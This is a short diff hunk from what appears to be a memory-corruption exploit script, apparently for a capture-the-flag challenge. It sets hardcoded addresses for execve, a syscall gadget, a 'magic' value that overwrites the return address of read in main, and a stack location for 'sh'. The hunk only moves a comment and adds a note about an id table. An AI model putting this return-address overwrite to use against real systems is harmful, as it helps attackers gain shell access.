@@ -23,7 +23,10 @@ ret_stack_addr = 0xfffffd78
 execve = 0xff59acc0
 read_ret_in_libc = 0xff5c1980  
 syscall_ret = 0xff5cd718
-magic = 0xff59b418 # use it to overwirte the return address of read in the main function 
+
+# Use it to overwirte the return address of read in the main function
+# The id table of the address need to match 0x1600000003.
+magic = 0xff59b418
 
 sh = ret_stack_addr + 0x160
 gadget_buf = ret_stack_addr + 0xe0
